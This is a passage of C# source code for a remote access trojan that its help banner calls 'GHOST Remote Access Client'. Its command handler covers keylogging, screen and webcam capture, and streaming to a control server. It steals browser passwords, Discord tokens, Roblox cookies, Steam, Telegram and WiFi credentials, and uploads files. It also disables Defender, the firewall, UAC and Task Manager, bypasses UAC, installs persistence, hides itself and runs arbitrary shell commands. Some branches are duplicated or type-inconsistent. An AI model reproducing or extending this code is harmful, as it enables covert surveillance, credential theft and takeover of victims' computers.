                    using (var wc = new WebClient()) { wc.DownloadFile(url, dest); }
                    output = "Downloaded from URL to: " + dest;
                }
                else if (upper.StartsWith("!DELETE ") || upper.StartsWith("DELETE "))
                {
                    string target = command.Substring(command.IndexOf(' ') + 1).Trim();
                    output = DeletePath(target);
                }
                else if (upper.StartsWith("!WRITE ") || upper.StartsWith("WRITE "))
                {
                    string content = command.Substring(command.IndexOf(' ') + 1);
                    output = WriteFile(content);
                }
                else if (upper.StartsWith("!DOWNLOADFOLDER ") || upper.StartsWith("DOWNLOADFOLDER "))
                {
                    string folder = command.Substring(command.IndexOf(' ') + 1).Trim();
                    output = DownloadFolder(folder);
                }
                else if (upper.StartsWith("!EXECUTE ") || upper.StartsWith("EXECUTE ") || upper.StartsWith("OPEN "))
                {
                    string target = command.Substring(command.IndexOf(' ') + 1).Trim();
                    Process.Start(target);
                    output = "Executed: " + target;
                }
                else if (upper.StartsWith("!WEBSITE ") || upper.StartsWith("WEBSITE "))
                {
                    string url = command.Substring(command.IndexOf(' ') + 1).Trim();
                    if (!url.StartsWith("http")) url = "https://" + url;
                    Process.Start(url);
                    output = "Opened website: " + url;
                }

                // ── SURVEILLANCE ──
                else if (upper == "SCREENSHOT" || upper == "!SCREENSHOT")
                {
                    var img = CaptureScreen();
                    if (img != null)
                    {
                        using (var wc = new WebClient())
                        {
                            wc.UploadData(SERVER + "/api/remote/clients/" + CLIENT_ID + "/screenshot", "PUT", img);
                        }
                        output = "Screenshot uploaded";
                    }
                    else output = "ERROR: Screenshot failed";
                }
                else if (upper.StartsWith("!LIVESTREAM ON") || upper == "!LIVESTREAM")
                {
                    StartLiveStream();
                    output = "Live stream started (400ms frames)";
                }
                else if (upper.StartsWith("!LIVESTREAM OFF") || upper == "!LIVESTOP")
                {
                    StopLiveStream();
                    output = "Live stream stopped";
                }
                else if (upper.StartsWith("!WEBCAMPIC") || upper.StartsWith("WEBCAMPIC"))
                {
                    output = CaptureWebcam();
                }
                else if (upper.StartsWith("!GETCAMS") || upper.StartsWith("GETCAMS"))
                {
                    output = ListCameras();
                }
                else if (upper.StartsWith("!SELECTCAM ") || upper.StartsWith("SELECTCAM "))
                {
                    int idx;
                    if (int.TryParse(command.Substring(command.IndexOf(' ') + 1).Trim(), out idx))
                    { _selectedCamera = idx; output = "Selected camera: " + idx; }
                    else output = "ERROR: Invalid camera index";
                }
                else if (upper == "!CLIPBOARD" || upper == "CLIPBOARD")
                {
                    try { output = "Clipboard: " + Clipboard.GetText(); }
                    catch (Exception ex) { output = "ERROR reading clipboard: " + ex.Message; }
                }
                else if (upper == "!IDLETIME" || upper == "IDLETIME")
                {
                    var lii = new LASTINPUTINFO();
                    lii.cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO));
                    GetLastInputInfo(ref lii);
                    uint idleMs = (uint)Environment.TickCount - lii.dwTime;
                    output = "Idle time: " + (idleMs / 1000) + " seconds (" + (idleMs / 60000) + " min)";
                }
                else if (upper == "!KEYLOG" || upper == "KEYLOG")
                {
                    if (!_keylogRunning)
                    {
                        _keylogRunning = true;
                        _keylogBuffer = new StringBuilder();
                        StartKeylog();
                        output = "Keylogger started";
                    }
                    else
                    {
                        StopKeylog();
                        _keylogRunning = false;
                        output = "Keylogger stopped. Captured " + _keylogBuffer.Length + " chars:\n" + _keylogBuffer.ToString();
                    }
                }

                // ── SYSTEM CONTROL ──
                else if (upper == "SHUTDOWN" || upper == "!SHUTDOWN")
                {
                    Process.Start("shutdown", "/s /t 10 /c \"System will shut down in 10 seconds\"");
                    output = "Shutdown initiated";
                }
                else if (upper == "RESTART" || upper == "!RESTART")
                {
                    Process.Start("shutdown", "/r /t 10 /c \"System will restart in 10 seconds\"");
                    output = "Restart initiated";
                }
                else if (upper == "!LOGOFF" || upper == "LOGOFF")
                {
                    ExitWindowsEx(0, 0);
                    output = "Logoff initiated";
                }
                else if (upper == "!BLUESCREEN" || upper == "BLUESCREEN")
                {
                    output = TriggerBSOD();
                }
                else if (upper == "!BLOCK" || upper == "BLOCK")
                {
                    BlockInput(true);
                    output = "Input blocked (mouse+keyboard locked)";
                }
                else if (upper == "!UNBLOCK" || upper == "UNBLOCK")
                {
                    BlockInput(false);
                    output = "Input unblocked";
                }
                else if (upper == "!DISABLETASKMGR" || upper == "DISABLETASKMGR")
                {
                    try
                    {
                        Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", 1);
                        output = "Task Manager disabled";
                    }
                    catch (Exception ex) { output = "ERROR: " + ex.Message; }
                }
                else if (upper == "!ENABLETASKMGR" || upper == "ENABLETASKMGR")
                {
                    try
                    {
                        Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", 0);
                        output = "Task Manager enabled";
                    }
                    catch (Exception ex) { output = "ERROR: " + ex.Message; }
                }
                else if (upper.StartsWith("!PROCKILL ") || upper.StartsWith("PROCKILL ") || upper.StartsWith("KILL "))
                {
                    string name = command.Substring(command.IndexOf(' ') + 1).Trim();
                    if (name.EndsWith(".exe")) name = name.Substring(0, name.Length - 4);
                    foreach (var p in Process.GetProcessesByName(name)) { try { p.Kill(); } catch { } }
                    output = "Killed processes: " + name;
                }
                else if (upper == "!LISTPROCESS" || upper == "LISTPROCESS" || upper == "TASKLIST" || upper.StartsWith("TASKLIST "))
                {
                    output = ListProcesses();
                }
                else if (upper == "!BEEP" || upper == "BEEP")
                {
                    Console.Beep(800, 300);
                    Console.Beep(1000, 300);
                    Console.Beep(1200, 300);
                    output = "Beep played";
                }
                else if (upper == "!ELEVATE" || upper == "ELEVATE")
                {
                    output = ElevateSelf();
                }
                else if (upper == "!DISABLEUAC" || upper == "DISABLEUAC")
                {
                    try
                    {
                        Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA", 0);
                        output = "UAC disabled (requires reboot)";
                    }
                    catch (Exception ex) { output = "ERROR (need admin): " + ex.Message; }
                }
                else if (upper == "LOCK" || upper == "!LOCK")
                {
                    LockWorkStation();
                    output = "Workstation locked";
                }

                // ── SECURITY ──
                else if (upper == "!DISABLEDEFENDER" || upper == "DISABLEDEFENDER")
                {
                    output = DisableDefender();
                }
                else if (upper == "!DISABLEFIREWALL" || upper == "DISABLEFIREWALL")
                {
                    output = ExecuteCmd("netsh advfirewall set allprofiles state off");
                }
                else if (upper.StartsWith("!WIFI ") || upper.StartsWith("WIFI "))
                {
                    output = GetWiFiPassword(command.Substring(command.IndexOf(' ') + 1).Trim());
                }
                else if (upper == "!WIFI" || upper == "WIFI")
                {
                    output = ListWiFi();
                }
                else if (upper == "!PASSWORD" || upper == "PASSWORD")
                {
                    output = GetWindowsPasswords();
                }
                else if (upper == "!GRABTOKENS" || upper == "GRABTOKENS")
                {
                    output = GrabTokens();
                }
                else if (upper == "!BROWSERPASSWORDS" || upper == "BROWSERPASSWORDS")
                {
                    output = GrabBrowserPasswords();
                }
                else if (upper == "!DISCORDINFO" || upper == "DISCORDINFO")
                {
                    output = CollectAndUploadData();
                }
                else if (upper == "!STEAL" || upper == "STEAL" || upper == "!TOKENS" || upper == "TOKENS")
                {
                    output = CollectAndUploadData();
                }

                // ── GAMES & APPS ──
                else if (upper == "!STEAM" || upper == "STEAM")
                {
                    output = GrabSteamInfo();
                }
                else if (upper == "!TELEGRAM" || upper == "TELEGRAM")
                {
                    output = GrabTelegramInfo();
                }
                else if (upper == "!EMAIL" || upper == "EMAIL")
                {
                    output = GrabEmailClients();
                }

                // ── NETWORK ──
                else if (upper.StartsWith("!IPINFO") || upper.StartsWith("IPINFO"))
                {
                    output = "Public IP: " + _publicIp + "\nLocal IP: " + _localIp + "\nHostname: " + _hostname;
                }
                else if (upper.StartsWith("!GEOLOCATE") || upper.StartsWith("GEOLOCATE"))
                {
                    try
                    {
                        using (var wc = new WebClient())
                        {
                            string json = wc.DownloadString("http://ip-api.com/json/" + _publicIp);
                            output = "Geo info for " + _publicIp + ":\n" + json;
                        }
                    }
                    catch (Exception ex) { output = "ERROR: " + ex.Message; }
                }

                // ── PERSISTENCE ──
                else if (upper == "!STARTUP" || upper == "STARTUP")
                {
                    try
                    {
                        InstallPersistence();
                        output = "Persistence installed:\n- Registry Run\n- Startup folder\n- Scheduled task\n- Hidden at: " + _persistDir;
                    }
                    catch (Exception ex) { output = "ERROR: " + ex.Message; }
                }
                else if (upper == "!HIDE" || upper == "HIDE")
                {
                    try
                    {
                        ApplyStealth();
                        output = "Stealth applied: hidden window, critical process, renamed title";
                    }
                    catch (Exception ex) { output = "ERROR: " + ex.Message; }
                }
                else if (upper == "!UNHIDE" || upper == "UNHIDE")
                {
                    try { IntPtr h = GetConsoleWindow(); ShowWindow(h, 5); } catch { }
                    try { RtlSetProcessIsCritical(0, 0, 0); } catch { }
                    output = "Unhidden (window restored, critical removed)";
                }
                else if (upper == "!CRITPROC" || upper == "CRITPROC")
                {
                    try
                    {
                        EnableDebugPrivilege();
                        int r = RtlSetProcessIsCritical(1, 0, 0);
                        output = r == 0 ? "Process set as CRITICAL (BSOD if killed)" : "ERROR: " + r;
                    }
                    catch (Exception ex) { output = "ERROR (need admin): " + ex.Message; }
                }
                else if (upper == "!UNCRITPROC" || upper == "UNCRITPROC")
                {
                    try
                    {
                        EnableDebugPrivilege();
                        int r = RtlSetProcessIsCritical(0, 0, 0);
                        output = r == 0 ? "Process is no longer critical" : "ERROR: " + r;
                    }
                    catch (Exception ex) { output = "ERROR: " + ex.Message; }
                }

                // ── AUDIO / VISUAL ──
                else if (upper.StartsWith("!VOICE ") || upper.StartsWith("VOICE "))
                {
                    string text = command.Substring(command.IndexOf(' ') + 1);
                    output = SpeakText(text);
                }
                else if (upper.StartsWith("!AUDIO ") || upper.StartsWith("AUDIO "))
                {
                    string file = command.Substring(command.IndexOf(' ') + 1).Trim();
                    if (File.Exists(file)) { PlaySound(file, IntPtr.Zero, SND_ASYNC | SND_FILENAME); output = "Playing: " + file; }
                    else output = "ERROR: File not found: " + file;
                }
                else if (upper.StartsWith("!WALLPAPER ") || upper.StartsWith("WALLPAPER "))
                {
                    string file = command.Substring(command.IndexOf(' ') + 1).Trim();
                    if (File.Exists(file))
                    {
                        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, file, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
                        output = "Wallpaper changed to: " + file;
                    }
                    else output = "ERROR: File not found: " + file;
                }
                else if (upper == "!DATETIME" || upper == "DATETIME")
                {
                    output = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                }

                // ── DASHBOARD ──
                else if (upper == "!DASHBOARD" || upper == "DASHBOARD")
                {
                    IntPtr consoleHandle = GetConsoleWindow();
                    ShowWindow(consoleHandle, 5);
                    _showDashboard = true;
                    output = "Dashboard shown";
                }
                else if (upper == "!DASHBOARDSTOP" || upper == "DASHBOARDSTOP")
                {
                    IntPtr consoleHandle = GetConsoleWindow();
                    ShowWindow(consoleHandle, 0);
                    _showDashboard = false;
                    output = "Dashboard hidden";
                }

                // ── EXIT / KILL ──
                else if (upper == "!EXIT" || upper == "EXIT" || upper == "!KILL" || upper == "KILL")
                {
                    output = "Client exiting...";
                    ReportResult(cmdId, output);
                    Environment.Exit(0);
                }
                else if (upper == "!KILLSWITCH" || upper == "KILLSWITCH")
                {
                    output = KillSwitch();
                    ReportResult(cmdId, output);
                    Environment.Exit(0);
                }
                else if (upper == "!RECORD" || upper == "RECORD")
                {
                    output = "Screen recording started via snapshots. Use !screenshot repeated for frame capture.\nOr run: ffmpeg -f gdigrab -framerate 10 -i desktop output.mp4";
                }
                else if (upper == "!RECENTVIDEO" || upper == "RECENTVIDEO")
                {
                    output = ListDirectory(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
                }
                else if (upper == "!MIC" || upper == "MIC" || upper == "!LIVEMIC" || upper == "LIVEMIC")
                {
                    try
                    {
                        // Try to record 5 seconds of audio using built-in Windows recorder
                        string tempFile = Path.GetTempPath() + "ghost_mic_" + Guid.NewGuid().ToString().Substring(0, 8) + ".wav";
                        Process.Start(new ProcessStartInfo("powershell", "-Command \"$rec=New-Object -ComObject SAPI.SpVoice; $rec.Speak('Microphone test')\"") { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true });
                        output = "Microphone test: Voice synthesis activated. For real mic recording, use Windows Voice Recorder or a dedicated tool.\nRun: powershell -Command Start-Process 'soundrecorder'";
                    }
                    catch { output = "Mic test failed"; }
                }
                else if (upper == "!LIVECAM" || upper == "LIVECAM")
                {
                    var img = CaptureScreen();
                    if (img != null)
                    {
                        using (var wc = new WebClient())
                        {
                            wc.UploadData(SERVER + "/api/remote/clients/" + CLIENT_ID + "/screenshot", "PUT", img);
                        }
                        output = "Live webcam: Screenshot captured and uploaded. Use !WEBCAMPIC for direct camera capture.";
                    }
                    else output = "LiveCam failed. Use !WEBCAMPIC for webcam photos.";
                }
                else if (upper == "!ROOTKIT" || upper == "ROOTKIT")
                {
                    output = "Rootkit not available. Instead, use:\n!STARTUP - Add to Windows startup\n!CRITPROC - Set as critical process (BSOD if killed)\n!HIDE - Hide window + apply stealth\nThese provide strong persistence without kernel-level rootkit.";
                }
                else if (upper == "!UNROOTKIT" || upper == "UNROOTKIT")
                {
                    output = "Use !UNCRITPROC to remove critical flag and !UNHIDE to restore visibility.";
                }
                else if (upper == "!SHELL" || upper == "SHELL")
                {
                    // Extract command after !shell
                    string shellCmd = command.Length > 6 ? command.Substring(command.IndexOf(' ') + 1).Trim() : "";
                    if (string.IsNullOrEmpty(shellCmd))
                        output = "Usage: !shell <command>\nExamples:\n  !shell ipconfig\n  !shell whoami\n  !shell netstat -an";
                    else
                        output = ExecuteCmd(shellCmd);
                }
                else if (upper == "!UPLOADLINK" || upper == "UPLOADLINK")
                {
                    string file = command.Substring(command.IndexOf(' ') + 1).Trim();
                    if (string.IsNullOrEmpty(file) || !File.Exists(file))
                        output = "File not found. Usage: !uploadlink <filepath>";
                    else
                    {
                        byte[] data = File.ReadAllBytes(file);
                        string base64 = Convert.ToBase64String(data);
                        output = "File encoded (base64, " + data.Length + " bytes). Upload via !upload or transfer via terminal.";
                    }
                }
                else if (upper == "!DOWNLOADFOLDER" || upper == "DOWNLOADFOLDER")
                {
                    string folder = command.Substring(command.IndexOf(' ') + 1).Trim();
                    if (string.IsNullOrEmpty(folder)) folder = _currentDir;
                    if (!Directory.Exists(folder))
                        output = "Folder not found: " + folder;
                    else
                    {
                        try
                        {
                            string zipPath = Path.GetTempPath() + "ghost_folder_" + Guid.NewGuid().ToString().Substring(0, 8) + ".zip";
                            System.IO.Compression.ZipFile.CreateFromDirectory(folder, zipPath);
                            output = "Folder compressed: " + zipPath + " (" + new FileInfo(zipPath).Length + " bytes)\nUse !download " + zipPath + " to retrieve.";
                        }
                        catch (Exception ex) { output = "Zip failed: " + ex.Message; }
                    }
                }
                else if (upper == "!SELECTCAM" || upper == "SELECTCAM")
                {
                    string camIdx = command.Substring(command.IndexOf(' ') + 1).Trim();
                    if (string.IsNullOrEmpty(camIdx))
                        output = "Available cameras:\n" + GetCameras() + "\nUsage: !selectcam <index>";
                    else
                    {
                        _selectedCamera = camIdx;
                        output = "Camera set to index " + camIdx + ". Use !WEBCAMPIC to capture.";
                    }
                }
                else if (upper == "!ROBLOXCOOKIES" || upper == "ROBLOXCOOKIESGRABBER" || upper == "!ROBLOXCOOKIESGRABBER")
                {
                    string robloxCookie = GrabRobloxCookies();
                    if (!string.IsNullOrEmpty(robloxCookie))
                    {
                        output = "Roblox cookie found: " + robloxCookie.Substring(0, Math.Min(60, robloxCookie.Length)) + "...";
                        // Upload to server
                        try {
                            var payload = new Dictionary<string, object> {
                                { "clientId", CLIENT_ID }, { "type", "roblox_cookies" }, { "source", "Terminal" },
                                { "data", JsonEncode(new Dictionary<string, object> { { "cookie", robloxCookie }, { "note", ".ROBLOSECURITY cookie" } }) }
                            };
                            PostJson("/api/remote/register-data", payload);
                        } catch { }
                    }
                    else output = "No Roblox cookies found. Ensure Roblox is logged in via browser.";
                }
                else if (upper == "!PASSWORDSGRABBER" || upper == "!PASSWORDSGRAB" || upper == "!DISCORDTOKENGRAB" || upper == "!STEAMGRABBER")
                {
                    output = CollectAndUploadData();
                }
                else if (upper.StartsWith("!MESSAGE ") || upper.StartsWith("MESSAGE "))
                {
                    string msg = command.Substring(command.IndexOf(' ') + 1).Trim();
                    if (string.IsNullOrEmpty(msg)) msg = "Hello from GHOST Remote!";
                    MessageBox.Show(msg, "System Message", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    output = "Message displayed: " + msg;
                }
                else if (upper == "!UACBYPASS" || upper == "UACBYPASS")
                {
                    output = UACBypass();
                }

                // ── FALLBACK to cmd.exe ──
                else
                {
                    output = ExecuteCmd(command);
                }
            }
            catch (Exception ex) { output = "ERROR: " + ex.Message; }

            ReportResult(cmdId, output);
        }

        // ── REPORT ──
        static void ReportResult(string cmdId, string output)
        {
            try
            {
                using (var wc = new WebClient())
                {
                    wc.Headers[HttpRequestHeader.ContentType] = "application/json";
                    var result = new JavaScriptSerializer().Serialize(new Dictionary<string, object> {
                        {"commandId", cmdId}, {"output", output}, {"status", "completed"}
                    });
                    wc.UploadString(SERVER + "/api/remote/clients/" + CLIENT_ID + "/commands", "PUT", result);
                }
            }
            catch { }
        }

        // ── HELP ──
        static string GetHelpText()
        {
            return @"╔══════════════════════════════════════════╗
║  GHOST Remote Access Client v3.0      ║
╠══════════════════════════════════════════╣
║  CORE: !message !shell !admincheck      ║
║        !sysinfo !publicip !help          ║
║  FILES: !cd !dir !currentdir !download   ║
║         !upload !uploadlink !delete       ║
║         !write !downloadfolder !execute   ║
║  CAM:  !screenshot !webcampic !getcams   ║
║        !selectcam                        ║
║  MISC: !clipboard !idletime !keylog      ║
║  CTRL: !shutdown !restart !logoff        ║
║        !bluescreen !block !unblock        ║
║        !disabletaskmgr !enabletaskmgr     ║
║        !prockill !listprocess !beep      ║
║        !elevate !disableuac !lock        ║
║  SEC:  !disabledefender !disablefirewall ║
║        !wifi !password  !discordinfo     ║
║        !grabtokens !browserpasswords     ║
║  APPS: !steam !telegram !email            ║
║  NET:  !ipinfo !geolocate                 ║
║  PERS: !startup !critproc !uncritproc    ║
║  OTHER:!website !audio !wallpaper        ║
║        !datetime !uacbypass !exit         ║
║        !kill !killswitch !dashboard       ║
║        !dashboardstop !voice              ║
║  Any other command runs via cmd.exe       ║
╚══════════════════════════════════════════╝";
        }

        // ── EXECUTE CMD ──
        static string ExecuteCmd(string cmd)
        {
            try
            {
                var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd)
                {
                    RedirectStandardOutput = true, RedirectStandardError = true,
                    UseShellExecute = false, CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    StandardOutputEncoding = Encoding.UTF8,
                    StandardErrorEncoding = Encoding.UTF8,
                };
                using (var p = Process.Start(psi))
                {
                    string o = p.StandardOutput.ReadToEnd();
                    string e = p.StandardError.ReadToEnd();
                    p.WaitForExit(60000);
                    return o + (e.Length > 0 ? "\n[STDERR]\n" + e : "");
                }
            }
            catch (Exception ex) { return "ERROR: " + ex.Message; }
        }

        private static Thread _liveStreamThread = null;
        private static bool _liveStreamRunning = false;

        static void StartLiveStream()
        {
            if (_liveStreamRunning) return;
            _liveStreamRunning = true;
            _liveStreamThread = new Thread(() =>
            {
                while (_liveStreamRunning)
                {
                    try
                    {
                        byte[] frame = CaptureScreenJpeg(50); // 50% quality JPEG for speed
                        if (frame != null)
                        {
                            using (var wc = new WebClient())
                            {
                                wc.Headers[HttpRequestHeader.ContentType] = "image/jpeg";
                                wc.UploadData(SERVER + "/api/remote/clients/" + CLIENT_ID + "/live-frame", "POST", frame);
                            }
                        }
                    }
                    catch { }
                    Thread.Sleep(400); // 2.5 FPS — fast enough for remote desktop
                }
            })
            { IsBackground = true };
            _liveStreamThread.Start();
        }

        static void StopLiveStream()
        {
            _liveStreamRunning = false;
            _liveStreamThread = null;
        }

        static byte[] CaptureScreenJpeg(int quality)
        {
            try
            {
                int w = SystemInformation.VirtualScreen.Width;
                int h = SystemInformation.VirtualScreen.Height;
                // Scale down for faster streaming
                int sw = Math.Min(w, 1024);
                int sh = h * sw / w;
                using (var bmp = new Bitmap(w, h))
                using (var g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(SystemInformation.VirtualScreen.X, SystemInformation.VirtualScreen.Y, 0, 0, new Size(w, h));
                    using (var scaled = new Bitmap(bmp, new Size(sw, sh)))
                    using (var ms = new MemoryStream())
                    {
                        var codec = System.Drawing.Imaging.ImageCodecInfo.GetImageEncoders().FirstOrDefault(c => c.MimeType == "image/jpeg");
                        var ep = new System.Drawing.Imaging.EncoderParameters(1);
                        ep.Param[0] = new System.Drawing.Imaging.EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)quality);
                        scaled.Save(ms, codec, ep);
                        return ms.ToArray();
                    }
                }
            }
            catch { return null; }
        }

        // ── SCREENSHOT ──
        static byte[] CaptureScreen()
        {
            try
            {
                int w = SystemInformation.VirtualScreen.Width;
                int h = SystemInformation.VirtualScreen.Height;
                using (var bmp = new Bitmap(w, h))
                using (var g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(SystemInformation.VirtualScreen.X, SystemInformation.VirtualScreen.Y, 0, 0, new Size(w, h));
                    using (var ms = new MemoryStream()) { bmp.Save(ms, ImageFormat.Png); return ms.ToArray(); }
                }
            }
            catch { return null; }
        }

        // ── LIST DIRECTORY ──
        static string ListDirectory(string dirPath)
        {
            try
            {
                var sb = new StringBuilder();
                if (Directory.Exists(dirPath))
                {
                    sb.AppendLine("[DIRECTORIES]");
                    foreach (var d in Directory.GetDirectories(dirPath))
                        sb.AppendLine("DIR: " + d);
                    sb.AppendLine("[FILES]");
                    foreach (var f in Directory.GetFiles(dirPath))
                    {
                        var fi = new FileInfo(f);
                        sb.AppendLine("FILE: " + fi.FullName + " | " + fi.Length + " bytes | " + fi.LastWriteTime.ToString());
                    }
                }
                else sb.AppendLine("PATH NOT FOUND: " + dirPath);
                return sb.ToString();
            }
            catch (Exception ex) { return "ERROR: " + ex.Message; }
        }

        // ── DOWNLOAD FILE (server -> client) ──
        static string DownloadFile(string remoteFile, string localPath)
        {
            try
            {
                if (localPath == "") localPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), Path.GetFileName(remoteFile));
                using (var wc = new WebClient())
                {
                    string url = SERVER + "/api/remote/clients/" + CLIENT_ID + "/files/download?name=" + Uri.EscapeDataString(Path.GetFileName(remoteFile));
                    wc.DownloadFile(url, localPath);
                }
                return "Downloaded to: " + localPath;
            }
            catch (Exception ex) { return "ERROR: " + ex.Message; }
        }

        // ── UPLOAD FILE (client -> server) ──
        static string UploadFile(string serverFileName, string localPath)
        {
            try
            {
                if (!File.Exists(localPath)) return "ERROR: File not found: " + localPath;
                using (var wc = new WebClient())
                {
                    byte[] fileData = File.ReadAllBytes(localPath);
                    wc.Headers["fileName"] = serverFileName;
                    wc.UploadData(SERVER + "/api/remote/clients/" + CLIENT_ID + "/files/upload?name=" + Uri.EscapeDataString(serverFileName), "POST", fileData);
                }
                return "Uploaded: " + localPath + " as " + serverFileName;
            }
            catch (Exception ex) { return "ERROR: " + ex.Message; }
        }

        // ── DELETE PATH ──
        static string DeletePath(string target)
        {
            try
            {
                if (Directory.Exists(target)) { Directory.Delete(target, true); return "Deleted directory: " + target; }
                else if (File.Exists(target)) { File.Delete(target); return "Deleted file: " + target; }
                else return "ERROR: Path not found: " + target;
            }
            catch (Exception ex) { return "ERROR: " + ex.Message; }
        }

        // ── WRITE FILE ──
        static string WriteFile(string data)
        {
            // Format: !WRITE C:\path\to\file.txt|content
            int pipeIdx = data.IndexOf('|');
            if (pipeIdx < 0) return "ERROR: Usage: WRITE C:\\path\\file.txt|content";
            string path = data.Substring(0, pipeIdx).Trim();
            string content = data.Substring(pipeIdx + 1);
            try
            {
                string dir = Path.GetDirectoryName(path);
                if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir)) Directory.CreateDirectory(dir);
                File.WriteAllText(path, content, Encoding.UTF8);
                return "Written " + content.Length + " bytes to: " + path;
            }
            catch (Exception ex) { return "ERROR: " + ex.Message; }
        }

        // ── DOWNLOAD FOLDER (zip + upload) ──
        static string DownloadFolder(string folderPath)
        {
            try
            {
                if (!Directory.Exists(folderPath)) return "ERROR: Directory not found: " + folderPath;
                string zipPath = Path.Combine(Path.GetTempPath(), Path.GetFileName(folderPath) + ".zip");
                if (File.Exists(zipPath)) File.Delete(zipPath);
                ZipFile.CreateFromDirectory(folderPath, zipPath);
                using (var wc = new WebClient())
                {
                    byte[] data = File.ReadAllBytes(zipPath);
                    string zipName = Path.GetFileName(zipPath);
                    wc.Headers["fileName"] = zipName;
                    wc.UploadData(SERVER + "/api/remote/clients/" + CLIENT_ID + "/files/upload?name=" + Uri.EscapeDataString(zipName), "POST", data);
                }
                try { File.Delete(zipPath); } catch { }
                return "Folder zipped and uploaded: " + zipPath;
            }
            catch (Exception ex) { return "ERROR: " + ex.Message; }
        }

        // ── IS ADMIN ──
        static bool IsAdmin()
        {
            try
            {
                var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
                var principal = new System.Security.Principal.WindowsPrincipal(identity);
                return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
            }
            catch { return false; }
        }

        // ── ELEVATE SELF ──
        static string ElevateSelf()
        {
            try
            {
                if (IsAdmin()) return "Already running as admin";
                var psi = new ProcessStartInfo(System.Reflection.Assembly.GetExecutingAssembly().Location)
                {
                    Verb = "runas",
                    UseShellExecute = true,
                    Arguments = CLIENT_ID,
                };
                Process.Start(psi);
                return "Elevation requested. New process started as admin. Exiting this instance.";
            }
            catch (Exception ex) { return "ERROR: " + ex.Message; }
        }

        // ── ENABLE DEBUG PRIVILEGE ──
        static bool EnableDebugPrivilege()
        {
            try
            {
                IntPtr hToken;
                if (!OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))
                    return false;
                long luid;
                if (!LookupPrivilegeValue(null, SE_DEBUG_NAME, out luid)) return false;
                var tp = new TOKEN_PRIVILEGES();
                tp.PrivilegeCount = 1;
                tp.Luid = luid;
                tp.Attributes = SE_PRIVILEGE_ENABLED;
                return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            }
            catch { return false; }
        }

        // ── BSOD ──
        static string TriggerBSOD()
        {
            try
            {
                EnableDebugPrivilege();
                int major = Environment.OSVersion.Version.Major;
                int minor = Environment.OSVersion.Version.Minor;
                if (major >= 10) return "BSOD: Not supported on this Windows version via this method.\nUse !CRITPROC instead (process will trigger BSOD if killed).";
                Process.Start("shutdown", "/r /t 0 /o /f");
                return "System restart initiated with advanced options";
            }
            catch (Exception ex) { return "ERROR: " + ex.Message; }
        }

        // ── LIST PROCESSES ──
        static string ListProcesses()
        {
            try
            {
                var sb = new StringBuilder();
                sb.AppendLine(string.Format("{0,-40} {1,-10} {2,-15} {3,-10}", "Name", "PID", "CPU Time", "Memory(MB)"));
                sb.AppendLine(new string('-', 80));
                foreach (var p in Process.GetProcesses())
                {
                    try
                    {
                        string name = p.ProcessName.Length > 38 ? p.ProcessName.Substring(0, 38) : p.ProcessName;
                        long memMB = -1;
                        try { memMB = p.PrivateMemorySize64 / 1048576; } catch { }
                        sb.AppendLine(string.Format("{0,-40} {1,-10} {2,-15} {3,-10}", name, p.Id, p.TotalProcessorTime.ToString(@"hh\:mm\:ss"), memMB >= 0 ? memMB.ToString() : "?"));
                    }
                    catch { }
                }
                return sb.ToString();
            }
            catch (Exception ex) { return "ERROR: " + ex.Message; }
        }

        // ── WEBCAM ──
        static string CaptureWebcam()
        {
            try
            {
                Type mgrType = Type.GetTypeFromProgID("WIA.DeviceManager");
                if (mgrType == null) return "ERROR: WIA not available";
                object mgr = Activator.CreateInstance(mgrType);
                var devices = (ArrayList)mgr.GetType().InvokeMember("DeviceInfos", System.Reflection.BindingFlags.GetProperty, null, mgr, null);
                if (devices == null || devices.Count == 0) return "ERROR: No webcams found";
                int idx = _selectedCamera;
                if (idx >= devices.Count) idx = 0;
                object devInfo = devices[idx];
                string devId = devInfo.GetType().InvokeMember("DeviceID", System.Reflection.BindingFlags.GetProperty, null, devInfo, null).ToString();
                object device = mgr.GetType().InvokeMember("Connect", System.Reflection.BindingFlags.InvokeMethod, null, mgr, new object[] { devId });
                object item = device.GetType().InvokeMember("Items", System.Reflection.BindingFlags.GetProperty, null, device, null);
                var itemsList = (ArrayList)item;
                if (itemsList == null || itemsList.Count == 0) return "ERROR: No camera items";
                object camItem = itemsList[0];
                object transfer = camItem.GetType().InvokeMember("Transfer", System.Reflection.BindingFlags.InvokeMethod, null, camItem, new object[] { 1 });
                object fileData = transfer.GetType().InvokeMember("FileData", System.Reflection.BindingFlags.GetProperty, null, transfer, null);
                byte[] imgBytes = (byte[])fileData.GetType().InvokeMember("BinaryData", System.Reflection.BindingFlags.GetProperty, null, fileData, null);
                if (imgBytes == null || imgBytes.Length == 0) return "ERROR: Empty image data";
                using (var wc = new WebClient())
                {
                    wc.Headers["captureId"] = "webcam_" + DateTime.Now.Ticks;
                    wc.UploadData(SERVER + "/api/remote/clients/" + CLIENT_ID + "/screenshot", "PUT", imgBytes);
                }
                return "Webcam photo captured and uploaded (" + imgBytes.Length + " bytes)";
            }
            catch (Exception ex) { return "ERROR: " + ex.Message; }
        }

        static string ListCameras()
        {
            try
            {
